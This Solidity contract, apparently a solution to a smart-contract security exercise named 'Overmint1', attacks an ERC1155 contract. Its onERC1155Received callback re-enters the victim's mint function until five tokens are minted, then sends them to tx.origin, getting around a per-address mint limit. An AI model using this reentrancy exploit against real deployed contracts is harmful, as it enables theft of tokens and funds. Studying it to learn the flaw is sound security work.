// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {Overmint1_ERC1155} from "./Overmint1-ERC1155.sol";

contract Overmint1_ERC1155_Attacker {
    Overmint1_ERC1155 public immutable victim;
    uint256 minted;

    constructor(Overmint1_ERC1155 victim_) {
        victim = victim_;
    }

    function attack() external {
        victim.mint(0, "");
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        external
        returns (bytes4)
    {
        minted++;
        if (minted < 5) {
            victim.mint(0, "");
        } else {
            victim.safeTransferFrom(address(this), tx.origin, 0, 5, "");
        }
        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }
}
